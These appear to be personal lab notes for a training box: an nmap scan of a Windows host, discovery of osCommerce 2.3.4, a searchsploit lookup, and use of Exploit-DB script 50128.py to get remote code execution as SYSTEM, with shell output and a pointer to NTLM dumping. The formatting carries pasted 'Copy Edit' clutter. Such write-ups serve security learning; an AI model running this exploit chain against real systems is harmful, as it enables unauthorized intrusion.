# Nmap Scan & Exploitation Notes

## Initial Enumeration

```bash
nmap -sCV -Pn 10.10.45.93
Scan Output:

swift
Copy
Edit
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 02:46 EDT
Nmap scan report for 10.10.45.93
Host is up (0.36s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
...
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
...
Important Notes
-sC is often used together with -sV (version detection):

bash
Copy
Edit
nmap -sC -sV <target>
This combo is a good initial enumeration scan.

Web Enumeration
Proxy service: 8080/tcp — Apache HTTPD 2.4.23 (PHP 5.6.28)

Visit: http://10.10.45.93:8080

Found application: osCommerce 2.3.4

Exploit Search
bash
Copy
Edit
searchsploit oscommerce 2.3.4
Relevant results:

nginx
Copy
Edit
osCommerce 2.3.4.1 - Arbitrary File Upload     | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution     | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2) | php/webapps/50128.py
Exploit references:

https://www.exploit-db.com/exploits/44374

https://www.exploit-db.com/shellcodes/50128

Exploitation
On Kali, navigate to:

bash
Copy
Edit
cd /usr/share/exploitdb/exploits/php/webapps
python3 50128.py http://10.10.45.93:8080/oscommerce-2.3.4/catalog/
Example output:

pgsql
Copy
Edit
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system
Post-Exploitation
Example shell usage:

swift
Copy
Edit
RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

07/28/2025  08:37 AM    <DIR>          .
07/28/2025  08:37 AM    <DIR>          ..
04/11/2019  10:52 PM               447 application.php
07/28/2025  08:40 AM             1,118 configure.php
04/11/2019  10:52 PM    <DIR>          functions
Privilege check:

shell
Copy
Edit
RCE_SHELL$ whoami
nt authority\system
Notes & References
For NTLM dumping, check the NTLM section in Redteam notes.

Useful command reference: SS64.com (Windows CMD, Linux, PowerShell, etc.)
